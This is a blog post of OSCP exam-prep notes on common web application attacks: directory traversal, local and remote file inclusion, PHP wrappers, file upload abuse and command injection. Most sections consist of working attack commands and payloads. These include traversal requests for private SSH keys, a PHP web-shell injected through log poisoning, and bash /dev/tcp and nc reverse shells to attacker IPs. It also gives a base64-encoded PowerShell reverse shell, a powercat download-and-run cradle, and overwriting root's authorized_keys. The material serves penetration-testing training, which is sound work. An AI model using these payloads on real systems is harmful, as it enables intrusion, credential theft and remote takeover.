---
title: Common Web App Attacks
date: 2024-03-02 08:15:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Web App Attack tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Common Web App Attacks

## Directory Traversal

### Absolute vs Relative Paths

When referencing an absolute path, specify the the full file system path including subdirectories. The absolute path can be referred to from any location in the filesystem. Since /etc/passwd is in the root directory, we can use it from any location in the filesystem.

Relative paths make use of ../ to move backwards in the filesystem and can be stacked:

```console
$ cat ../../../../etc.passwd
```

We could use this when we don't know what our current working directory is. By using a large number of ../, we can ensure we reach the root file system. 

### Identifying and Exploiting Directory Traversals

In Directory Traversal attacks, we can access sensitive files of web servers. This is possible when web apps do not sanitize user input.

On Linux systems, web server files are typically displayed from the web root /var/www/html. Typically, the webpage http://website.com/afile.html is accessing the file at /var/www/html/afile.html. When web apps are vulnerable to directory traversal, we can access files outside of the web root.

Let's analyze the following link for vulnerabilities: https://website.com/customer/login.php?language=en.html
- login.php - the site uses PHP!
- ?language= - the site contains a language parameter. We should try to navigate to that file directly (https://website.com/home/en.html). If it opens successfully, we can try to use other file names.
- /customer/ - the web root contains a subdirectory

Hypothetically, we may find a link such as: http://website.com/customer/index.php?page=admin.php
- This site uses PHP and has a ?page= parameter.
- PHP uses $_GET to manage variables via a GET request.
- Try: http://website.com/customer/index.php?page=../../../../../../../../../etc/passwd

Web servers are typically ran in the context of a dedicated users, such as www-data, who have limited perms on the system. However, some users and admins set excessive permissions for file access. Due to this, we should always check for SSH keys and their perms.

SSH keys are usually in the home directory of a user in the .ssh folder. 

/etc/passwd contains the home directory path of all users, and we can try to display the content of a user's private key:

http://website.com/customer/index.php?page=../../../../../../../../../home/targetuser/.ssh/id_rsa
- Replace "targetuser" above with a legitimate user listed in /etc/passwd.

Once you identify a vulnerability, don't rely on the browser! Use cURL to avoid the alterations browsers make.

```console
$ curl http://website.com/customer/index.php?page=../../../../../../../../home/targetuser/.ssh/id_rsa
```

Copy and paste the key from ---BEGIN OPENSSH PRIVATE KEY--- to ---END OPENSSH PRIVATE KEY--- into a file called dt_key. 

Change the file permissions of dt_key so that only the user/owner can read the file. This avoids future errors.

```console
$ chmod 400 dt_key
```

Using this key, let's try to connect to the target system via SSH on port 2222. Use the -i parameter to specify the dt_key file.

```console
$ ssh -i dt_key -p 2222 targetuser@website.com
```

### Directory Traversal Attacks on Windows

On Windows, instead of /etc/passwd, we use C:\Windows\System32\drivers\etc\hosts to test directory traversal vulnerabilities. After verifying this works, you can test traversing to other sensitive files. It is generally more difficult to execute directory traversal for system access on Windows than it is on Linux. There is no direct equivalent in Windows to the Linux steps taken above.

Sensitive files are additionally less easy to find on Windows without listing directory contents. To get around this, we should investigate the web app more closely and gather information about the server framework, language, etc.

Once we know about the web server, we can use this information to research paths to sensitive files. Research a server's log paths and web root structure. For example, if a system is running the Internet Information Services (IIS) web server, the logs are located at C:\inetpub\logs\LogFiles\W3SVC1\. We should also always check C:\inetpub\wwwroot\web.config, which might have usernames and passwords.

We may find web apps on Windows which are only vulnerable to directory traversals using backslashes. Always try both when a web app is running on Windows.

### Encoding Special Characters

Let's exploit a directory traversal vuln in Apache 2.4.49, which is exploitable by specifying the cgi-nim directory in the URL. 

```console
$ curl http://111.111.111.111/cgi-bin/../../../../../../../../../../../../../etc/passwd

// some error prevents this?
```

TIP: The ../../../ sequence is often filtered by web application firewalls, web servers, or web apps due to it being a common abuse method.v

To get around this, we can use https://www.w3schools.com/tags/ref_urlencode.asp (aka Percent Encoding). We can leverage ASCII encoding lists that can encode our query, or we can use online converters.

URL encoding is typically used to convert characters in a web request into a internet-transmissable format. Poorly configured filters may block ../ but not %2e@2e/.

If we only encode the periods, we get:

```console
curl http://111.111.111.111/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

## File Inclusion Vulnerabilities

### Local File Inclusion (LFI)

Firstly, mixing up a File Inclusion vuln with a Directory Traversal vuln can result in us missing an opportunity to execute arbitrary code!

Directory Traversal allows us to obtain contents of a file that are not in the server's web root.

File Inclusion allows us to "include" a file in the app's running code, which means we can execute local or remote files.

If we exploit a Directory Traversal vuln on the admin.php file, we'll see the source code. However, if we exploit a File Inclusion vuln, we'll have admin.php executed.

Our goal is to conduct Remote Code Execution (RCE) via a Local File Inclusion vuln, and we will do this with Log Poisoning, which modifies data we send to a webapp so the logs contain executable code. To learn where we control input, we can either read the Apache web server documentation or display the file with LFI.

We can use curl to display the Apache access.log to see the elements that comprise a log entry.

```console
$ curl http://website.com/customer/index.php?page=../../../../../../../../../var/log/apache2/access.log

...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /customer/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
...
```

It appears, in this case, that the User Agent is part of the log entry. With Burp, we can modify the User Agent to specify what will be written in the access.log to be executed.

After navigating to your target page, go to HTTP History and send the request to Repeater. Modify the User Agent field with some PHP code:

```html
User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
```

To execute this, we need to update the page parameter in the current Burp request with a relative path and a cmd parameter, as seen below. Don't forget to remove the User Agent line to avoid multiple executions.

```html
GET /customer/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=ps HTTP/1.1
```

In the Response section, you will see the output of the executed ps command. If we update the command to ls -la, we will trigger an error, because of the space between the command and the flags! There's a few options for getting around this, like URL encoding or Input Field Separators (IFS). We will use URL encoding:

```html
GET /customer/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la HTTP/1.1
```

If this works, we have achieved command execution! We can leverage this to gain reverse shell. Or, we can try to add our SSH key to the authorized_keys file for a user.

Let's first try for a reverse shell:

```html
GET /customer/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=bash -i >& /dev/tcp/111.111.111.111/4444 0>&1 HTTP/1.1
```

We will be executing this via the PHP system function, and it may be executed with the Bourne Shell (sh) instead of Bash. This one-liner above contains syntax that Bourne Shell does not support. To fix this, we need nee to ensure the shell is executed with Bash. Let's provide the command an argument to bash -c.

```html
GET /customer/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=bash -c "bash -i >& /dev/tcp/111.111.111.111/4444 0>&1" HTTP/1.1

// URL Encode!

GET /customer/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%111.111.111.111%2F4444%200%3E%261%22
```

Now, before sending this, let's start a netcat listener on 4444.

```console
$ nc -nvlp 4444
```

Send your request in Burp. If successful, we have a reverse shell!

An additional interesting log file to try in the file inclusion GET may be in /xampp/apache/logs/access.log.

### LFI in Windows

The PHP code we used previously works in Windows, since the PHP system functionis independent from the OS. When Log Poisoning on Windows, we should know that the log files are in app-specific paths. For example, a target running XAMPP has logs in C:\xampp\apache\logs\.

We can also similarly exploit RFI and LFI on frameworks like Perl, Active Server Pages Extended, Active Server Pages, Java Server Pages, and Node.js. We can simply adjust this exploit for different languages.

## PHP Wrappers

A feature of PHP is that it provides a wide variety of protocol weappers that increase capabilities. The wrappers can, for example, represent and access local or remote filesystems! We will use these wrappers to bypass filters or execute arbitrary code through File Inclusion vulns as we just covered.

The php://filter wrapper can display file contents with or without encodings (e.g., ROT13, Base64). We can conduct an altered version of an LFI attack using php://filter such that we display the file contents of executables like .php instead of running them.

Firstly, let's use curl against our admin.php page.

```console
$ curl http://targetwebsite/.com/customer/index.php?page=admin.php

...

<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance
```

We notice above that the <body> tag is not closed, and we assume this means that certain server-side executable code is not shown, so we know that the rest of the index.php's page content is missing.

Let's include the file using php://filter to gain more insight.

```console
$ curl http://targetwebsite.com/customer/index.php?page=php://filter/resource=admin.php
```

We might get the same output, so let's try again with Base64 encoding.

```console
$ curl http://targetwebsite.com/customer/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

This included the encoded data, so let's decode what we found.

```console
$ echo "thebase64encodedtext" | base64 -d
```

If we get credentials in this output, use them to try to connect to databases or accounts.

Now, let's try the data:// wrapper to try executing arbitrary code. This specific wrapper embeds data as plaintext or Base64 encoded data into the web app's running code.

```console
curl "http://targetwebsite.com/customer/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

This might need to be Base64 encoded to pass WAFs or other security controls.

```console
$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64

$curl "http://targetwebsite.com/customer/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

NOTE: In order for the data:// wrapper to work, the allow_url_include setting must be enabled! This will not succeed in the default PHP installation.

## Remote File Inclusion (RFI)

These will be less common than LFIs because we need to find that a target system is configured a certain way. The allow_url_include config must be enabled, just like above.

RFI allows us to include files from a remote system over HTTP or SMB. The included file will be executed in the context of the webapp. We will likely find this when a file, library, or app data is loaded in the webapp, and we can discover them in similar ways to how we found Directory Traversals and LFIs.

Kali has a few PHP webshells we can use in /usr/share/webshells/php/ for RFI. Using these, we can get a web-based CLI. Let's try simple-backdoor.php.

```console
$ cat simple-backdoor.php

...

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
```

We need to get this file accessible by our target. Let's start a web server on our Kali to serve the file - it must be fron the websell's directory! (We could also use a publicly-accessible file, like a Github file).

```console
kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
```

Use Curl to include the file via HTTP.

```console
kali@kali:/usr/share/webshells/php/$ curl "http://targetwebsite.com/customer/index.php?page=http://111.111.111.111/simple-backdoor.php&cmd=ls"

// replace the IP with your attack box IP.
```

If we see the output of the ls command, we should have successfully exploited an RFI vuln. You can take this a step further by using Netcat to create a reverse shell, as we did previously.


## File Upload Vulnerabilities

### Using Executable Files

We can make educated guesses about where to find upload mechanisms in a webapp. If the webapp is a Content Management System (CMS), we might upload an avatar photo for a profile or attach files to blog posts.  If the webapp is a company website, we should look in careeer sections or company-specific use cases for file upload mechanisms. If we have a lawyer's office as a target website, there might be case file uploads. We should always enumerate!

After finding a file upload mechanism, test what file types it accepts. In this example, have a photo upload, so lets try uploading something else.

```console
$ echo "accept me" > testing.txt
```
If this works, try the simple-backdoor.php we just used. Sometimes PHP files are blocked. We can try to bypass this filter by changing the file extension to a less-common PHP file extension like .phps or .php7. The most common ones that are often blocked would be .php and .phtml.

We can also try to bypass the filter by simply changing the case of the extentions. Change .php. to .pHP.

```
Upload worked!

File simple-backdoor.pHP has been uploaded in the uploads directory!
```

TIP: Another way to bypass a file type filter is to upload a file with an innocent .txt extension, and rename it within the web app back to the original extension.

Use Curl to explore.

```console
$ curl http://111.111.111.111/customer/uploads/simple-backdoor.pHP?cmd=dir
```
If we get the directory, contents, we know we can try for a reverse shell now, using a PowerShell one-liner for the experience.

```console
$ nc -nlvp 4444

// new terminal
// IP IN $Text BELOW MUST BE ATTACKER IP!

$ pwsh

> $Text = '$client = New-Object System.Net.Sockets.TCPClient("222.222.222.222",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

> $EncodedText =[Convert]::ToBase64String($Bytes)

> $EncodedText

> exit
```

Take the $Encoded Text value and put in at the end of ?cmd=powershell%20-enc%20__________.

```console
$ curl http://111.111.111.111/customer/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA3ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

Our nc listener should indicate if we have a successful connection.

If the target webapp was using ASP instead of PHP, we can follow the same exact steps with an ASP web shell from /usr/share/webshells/. 

## Using Non-Executable Files 

File Uploads can still have severe consequences even if we cannot get our file to execute. In this sort of situation, we should leverage another vuln like Directory Traversal to abuse the File Upload.

Consider that this is our File Upload request seen in Burp:

```
POST /upload HTTP/1.1
Host: mountaindesserts.com:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
.
.
.
Content-Disposition: form-data; name="myFile"; filename="testing.txt"
Content-Type: text/plain

accept me
```

In Repeater, change the filename= paramerter to a Directory Traversal and Send:

```
Content-Disposition: form-data; name="myFile"; filename="../../../../../../../../../testing.txt"
Content-Type: text/plain
```

Ideally, we see "Successfully Uploaded File: ../../../../../../../../testing.txt". However, we don't know if the web app used the relative path to place the file or if the web app gave us a generic message while sanitizing in the backend.

Let's assume the relative path was used and that we can try to blindly overwrite files. 

First, it's important to know the following:
- Webapps using Apache, Mginx, or other dedicated web servers often run with users like www-data on Linux. 
- On Windows, ISS web servers run  as a Network Service Account, which is passwordless with low privileges.
- After ISS v7.5, Microsoft added ISS Application Pool Identities., which are virtual accounts that run webapps grouped by app pools. Each pool has its own pool identity, which makes it possible tp set specific permissions for accounts running webapps.
- Admins and devs using programming languages that include their own web server often deploy the webapp without privilege structures, running as Administrator or root to avoid perm issues. We should always check whether we can leverage root or admin privileges in a File Upload Vulnerability.

Let's attempt overwriting the authorized_keys file in the home dir for root! We can try to get our public key in it to SSH into the system as root. First, create your own SSH keypair.

```console
$ ssh-keygen
Enter file to save key (/home/kali/.ssh/id_rsa):
Enter passphrase (empty for no):
Enter same passphrase again:

$ cat fileup.pub > authorized_keys
```

Turn Burp intercept on and upload authorized_keys to the webapp. Intercept the upload and change the filename= parameter to filename="../../../../../../../../../../root/.ssh/authorized_keys" and Forward.

Since we have no way to determine users other than root by displaying /etc/passwd, our only option is to try to SSH as root. It is important to note that, often, root does not have SSH perms.

```console
// avoid errors
$ rm ~/.ssh/known_hosts

// ssh with priv key of pub key in authorized_keys
$ ssh -p 2222 -i fileup root@targetwebsite.com

// if you set a password for the key, use it when prompted
```

## Command Injection

Consider an application that ingests a command to clone git repositories:

[git clone repository_url]  [SUBMIT]

We can try to git clone https://github.com/offensive-security/exploitdb.

Let's try to inject arbitrary commands! Switch to HTTP history and get a lay of the POST request structure.

```
POST /archive HTTP/1.1
Host: 192.168.237.189:8000
.
.
.
Archive=git+clone+https%3A%2F%2Fgithub.com%2Foffensive-security%2Fexploitdb
```

We can use Curl to provide our own commands:

```console
$ curl -X POST --data 'Archive=ipconfig' http://111.111.111.111:8000/archive

Command Injection detected. Aborting...%!(EXTRA string=ipconfig)  
```

A detection! Let's backtrack...

```console
$ curl -X POST --data 'Archive=git' http://111.111.111.111:8000/archive

An error occured with execution: exit status 1 and usage: git [--version] [--help] [-C <path>] [-c <name>=<value>] ...

// git man... so we are not limited to "git clone"

$ curl -X POST --data 'Archive=git version' http://111.111.111.111:8000/archive

Repository successfully cloned with command: git version and output: git version 2.36.1.windows.1

// web app is running Windows

// %3B is URL encoding of semicolon, try to separate the commands

$ curl -X POST --data 'Archive=git%3Bipconfig' http://111.111.111.111:8000/archive

See 'git help git' for an overview of the system.

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192....

// both were executed. filter is checking for "git" being executed or contained in the param
```

Let's try to learn what environment we are in - CMD or PowerShell?

```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

Encoded: (dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
```

```console
$ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://111.111.111.111:8000/archive

See 'git help git' for an overview of the system.
PowerShell
```

Try for system access. Use Powercat (Kali's PS version of netcat) to create a reverse shell. 

```console
// second terminal

$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

$ python3 -m http.server 80

// third terminal

$ nc -nlvp 4444
```
We can go back to the first terminal to curl. We will inject this command: (222 should be attacker ip, 111 should be target ip)

IEX (New-Object System.Net.Webclient).DownloadString("http://222.222.222.222/powercat.ps1");powercat -c 222.222.222.222 -p 4444 -e powershell 

Encoded: IEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F222.222.222.222%2Fpowercat.ps1%22)%3Bpowercat%20-c%20222.222.222.222%20-p%204444%20-e%20powershell

```console
// first terminal

$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F222.222.222.222%2Fpowercat.ps1%22)%3Bpowercat%20-c%20222.222.222.222%20-p%204444%20-e%20powershell' http://111.111.111.111:8000/archive
```

We should also inject a PS reverse shell directly instead of using Powercat.

Extra examples:

```console
// to get reverse shell on linux
$ nc -nlvp 4444
// new terminal
$ curl -X POST --data 'Archive=git+version%3Bnc+192.168.45.224+4444+-e+/bin/bash' http://192.168.195.16/archive
// in nc terminal, elevate privileges in the shell
> sudo su
OS{d6209f10da9ecb87805d12feeb922e86}
```

Input field example, after nc listener is started: ffa=test"&&bash -c "bash -i >& /dev/tcp/222.222.222.222/4444 0>&1"&&whoami"  // if using curl, ensure this is encoded.
